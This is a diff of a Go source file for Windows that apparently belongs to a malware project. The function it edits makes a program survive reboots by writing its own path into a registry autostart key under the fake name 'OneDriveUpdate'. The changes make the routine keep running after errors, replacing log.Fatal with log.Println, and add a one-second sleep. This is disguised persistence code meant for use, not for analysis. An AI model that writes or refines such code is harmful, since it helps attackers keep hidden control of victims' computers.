@@ -6,6 +6,7 @@ import (
 	"os"
 	"path/filepath"
 	"runtime"
+	"time"
 
 	"golang.org/x/sys/windows/registry"
 )
@@ -24,7 +25,7 @@ func HWND_W32_Method_HKLM_Runer(path string) error {
 		},
 
 		Location:      fmt.Sprintf("%s\\_hklmruner.gUAC", os.Getenv("APPDATA")),
-		_K_HKLM_Runer: 0x3,
+		_K_HKLM_Runer: 0x4,
 	}
 
 	if len(c.Type)&len(c.Method) == 0 {
@@ -38,7 +39,7 @@ func HWND_W32_Method_HKLM_Runer(path string) error {
 	var currentDir string
 	currentDir, err = filepath.Abs(path)
 	if err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 
 	if runtime.GOARCH == "386" {
@@ -47,21 +48,21 @@ func HWND_W32_Method_HKLM_Runer(path string) error {
 			registry.QUERY_VALUE|registry.SET_VALUE|registry.ALL_ACCESS,
 		)
 		if err != nil {
-			log.Fatal(err)
+			log.Println(err)
 		}
 
 		// Setting "OneDriveUpdate" key value for the ABSOLUTE program path
 		// +0x23df ...
 
 		if err := wkey32WOW64.SetStringValue("OneDriveUpdate", currentDir); err != nil {
-			log.Fatal(err)
+			log.Println(err)
 		}
 
 		// Absolute key function closing
 		// +0x54ef ...
 
 		if err := wkey32WOW64.Close(); err != nil {
-			log.Fatal(err)
+			log.Println(err)
 		}
 
 	} else {
@@ -70,23 +71,25 @@ func HWND_W32_Method_HKLM_Runer(path string) error {
 			registry.QUERY_VALUE|registry.SET_VALUE|registry.ALL_ACCESS,
 		)
 		if err != nil {
-			log.Fatal(err)
+			log.Println(err)
 		}
 
 		// Setting "OneDriveUpdate" key value for the ABSOLUTE program path
 		// +0x25df ...
 
 		if err := wkey32MICROSOFT.SetStringValue("OneDriveUpdate", currentDir); err != nil {
-			log.Fatal(err)
+			log.Println(err)
 		}
 
 		// Absolute key function closing
 		// +0x54ef ...
 
 		if err := wkey32MICROSOFT.Close(); err != nil {
-			log.Fatal(err)
+			log.Println(err)
 		}
 	}
 
+	// Sleep for 1 second ...
+	time.Sleep(1 * 1 * time.Second)
 	return err
 }
